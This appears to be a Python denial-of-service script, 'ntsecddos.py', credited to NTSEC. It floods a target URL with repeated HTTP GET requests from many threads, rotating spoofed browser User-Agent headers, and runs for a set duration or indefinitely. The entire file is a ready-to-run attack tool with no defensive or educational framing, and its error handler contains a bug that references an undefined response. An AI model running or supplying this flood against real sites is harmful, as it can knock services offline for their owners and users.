import threading
import requests
import sys
import time
import random
from urllib.parse import urlparse

RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

running = True

def attack(target_url, thread_id):
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }
    
    while running:
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
            print(f"{BLUE}RPS {thread_id}{RESET} | {YELLOW}{target_url}{RESET}  | {BLUE}{response.status_code}{RESET}")
        except requests.exceptions.RequestException as e:
            print(f"{BLUE}RPS {thread_id}{RESET} | {YELLOW}{target_url}{RESET}  | {RED}{response.status_code}{RESET}")
        time.sleep(0.1)

if len(sys.argv) < 3:
    print("Usage: python ntsecddos.py <url> <threads> [time] 0=forever")
    sys.exit(1)

target = sys.argv[1]
threads_count = int(sys.argv[2])

duration = 0
if len(sys.argv) >= 4:
    duration = int(sys.argv[3])

parsed_url = urlparse(target)
if not parsed_url.scheme or not parsed_url.netloc:
    print("dak url like this https://example.com")
    sys.exit(1)

print(f"{BLUE}Attacking{RESET} {target} {YELLOW}with {threads_count} threads by NTSEC{RESET}", end=" ")
if duration > 0:
    print(f"{YELLOW}Running for {duration} seconds.{RESET}")
else:
    print("run until Ctrl+Z to stop.")

threads = []
for i in range(threads_count):
    t = threading.Thread(target=attack, args=(target, i+1))
    t.daemon = True
    threads.append(t)
    t.start()

try:
    if duration > 0:
        time.sleep(duration)
        running = False
    else:
        while running:
            time.sleep(1)
except KeyboardInterrupt:
    running = False

time.sleep(1)
print("Attack done.")
